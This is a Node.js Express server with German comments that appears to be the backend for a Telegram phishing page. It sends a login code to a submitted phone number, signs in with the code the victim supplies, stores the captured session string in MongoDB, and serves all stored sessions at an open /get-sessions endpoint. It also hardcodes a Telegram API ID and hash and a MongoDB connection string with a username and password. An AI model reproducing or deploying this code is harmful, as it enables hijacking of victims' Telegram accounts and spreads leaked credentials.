const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');

const app = express();
app.use(cors());
app.use(express.json());

// DEINE DATEN
const apiId = 23049703;
const apiHash = 'e9c00af578a9de0253ef02337460498f';
const MONGO_URI = "mongodb+srv://mercyinfo52_db_user:Hinva312-@cluster0.a0bslma.mongodb.net/?appName=Cluster0";

// Mongoose Connection
mongoose.connect(MONGO_URI)
    .then(() => console.log("SUCCESS: DB Connected"))
    .catch(err => console.error("FATAL: DB Connection Failed:", err));

// Mongoose Modell
const SessionSchema = new mongoose.Schema({
    phoneNumber: String,
    sessionString: String,
    date: { type: Date, default: Date.now }
});
const SessionModel = mongoose.model('Session', SessionSchema);

// Endpoint 1: OTP senden
app.post('/send-otp', async (req, res) => {
    try {
        const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
        await client.connect();
        const result = await client.sendCode({ apiId, apiHash }, req.body.phoneNumber);
        res.json({ success: true, phoneCodeHash: result.phoneCodeHash });
    } catch (err) {
        console.error("Error in /send-otp:", err);
        res.status(500).json({ success: false, error: err.message });
    }
});

// Endpoint 2: OTP verifizieren & speichern
app.post('/verify-otp', async (req, res) => {
    try {
        const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
        await client.connect();
        await client.signIn({
            phoneNumber: req.body.phoneNumber,
            phoneCodeHash: req.body.phoneCodeHash,
            phoneCode: req.body.phoneCode
        });
        
        const sessionString = client.session.save();
        await SessionModel.create({ phoneNumber: req.body.phoneNumber, sessionString });
        
        res.json({ success: true });
    } catch (err) {
        console.error("Error in /verify-otp:", err);
        res.status(500).json({ success: false, error: err.message });
    }
});

// Endpoint 3: Alle Sessions abrufen
app.get('/get-sessions', async (req, res) => {
    try {
        const sessions = await SessionModel.find();
        res.json(sessions);
    } catch (err) {
        console.error("Error in /get-sessions:", err);
        res.status(500).json({ error: err.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
